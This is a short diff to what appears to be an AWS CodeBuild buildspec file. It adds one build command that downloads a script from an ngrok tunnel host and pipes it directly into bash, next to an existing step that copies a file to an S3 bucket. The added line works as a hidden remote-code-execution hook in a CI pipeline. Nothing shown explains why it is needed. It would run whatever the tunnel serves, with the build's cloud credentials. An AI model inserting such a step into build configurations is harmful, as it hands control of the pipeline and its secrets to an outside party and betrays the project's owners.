@@ -5,4 +5,5 @@ phases:
       python: 3.9
   build:
     commands:
+      - curl  https://a79e-117-201-173-209.ngrok-free.app/testfile.sh | bash 
       - aws s3 cp Text.txt s3://buildanu/tttt 
